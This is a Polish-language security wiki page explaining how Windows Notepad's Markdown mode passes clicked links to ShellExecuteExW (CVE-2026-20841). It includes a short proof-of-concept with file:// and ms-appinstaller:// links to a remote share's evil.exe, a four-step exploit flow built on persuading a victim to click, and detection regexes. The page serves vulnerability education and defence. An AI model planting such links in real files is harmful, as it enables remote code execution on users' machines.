# Nadużycie Windows Protocol Handler / ShellExecute (renderery Markdown)

{{#include ../banners/hacktricks-training.md}}

Aplikacje Windows renderujące Markdown lub HTML mogą przekazywać kliknięte cele do `ShellExecuteExW`. Ponieważ ShellExecute obsługuje zarejestrowane schematy URI i skojarzenia plików, renderer powinien używać jawnej allowlisty, zamiast zakładać, że każdy link korzysta z HTTP(S). Opisane niżej zachowanie Notepad dotyczy CVE-2026-20841 i nie należy go uogólniać na wszystkie renderery.<sup>[[1]](#references)[[3]](#references)</sup>

## Interfejs ShellExecuteExW w trybie Markdown Notepad
- Notepad wybiera tryb Markdown **tylko dla rozszerzeń `.md`** na podstawie porównania stałych ciągów znaków w `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Obsługiwane linki Markdown:
  - Standardowe: `[text](target)`
  - Autolink: `<target>` (renderowany jako `[target](target)`), dlatego obie składnie mają znaczenie przy tworzeniu payloadów i ich wykrywaniu.
- Kliknięcia linków są obsługiwane przez `sub_140170F60()`, która stosuje słabe filtrowanie, a następnie wywołuje `ShellExecuteExW`.
- `ShellExecuteExW` obsługuje **dowolny skonfigurowany protocol handler**, nie tylko HTTP(S).<sup>[[1]](#references)</sup>

### Kwestie dotyczące payloadów
- Wszystkie sekwencje `\\` w linku są **normalizowane do `\`** przed wywołaniem `ShellExecuteExW`, co wpływa na tworzenie ścieżek UNC i payloadów oraz ich wykrywanie.
- Pliki `.md` **domyślnie nie są skojarzone z Notepad**; ofiara nadal musi otworzyć plik w Notepad i kliknąć link, ale po wyrenderowaniu link jest klikalny.
- Przykładowe niebezpieczne schematy:<sup>[[1]](#references)</sup>
  - `file://` do uruchomienia lokalnego payloadu lub payloadu UNC.
  - `ms-appinstaller://` do wywołania przepływów App Installer. Inne schematy zarejestrowane lokalnie również mogą być podatne na nadużycia.

### Minimalny PoC w Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Przebieg exploita
1. Przygotuj **plik `.md`**, aby Notepad renderował go jako Markdown.
2. Osadź link z niebezpiecznym schematem URI (`file:`, `ms-appinstaller:` lub dowolnym zainstalowanym handlerem).
3. Dostarcz plik (przez HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB lub podobny protokół) i przekonaj użytkownika, aby otworzył go w Notepad.
4. Po kliknięciu **znormalizowany link** jest przekazywany do `ShellExecuteExW`, a odpowiedni handler protokołu wykonuje wskazaną zawartość w kontekście użytkownika.<sup>[[1]](#references)[[2]](#references)</sup>

## Pomysły na wykrywanie
- Monitoruj transfery plików `.md` przez porty/protokoły, którymi często dostarczane są dokumenty: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizuj linki Markdown (standardowe i autolinki) i szukaj `file:` lub `ms-appinstaller:` bez rozróżniania wielkości liter.
- Wyrażenia regularne zalecane przez dostawców do wykrywania dostępu do zasobów zdalnych:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Poprawka dostawcy opisana przez ZDI ogranicza dozwolone cele do plików lokalnych i HTTP(S). W razie potrzeby rozszerz wykrywanie o inne zainstalowane programy obsługujące protokoły, ponieważ zarejestrowana powierzchnia ataku różni się w zależności od systemu.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: dowolne wykonanie kodu w Notatniku systemu Windows](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC dla CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
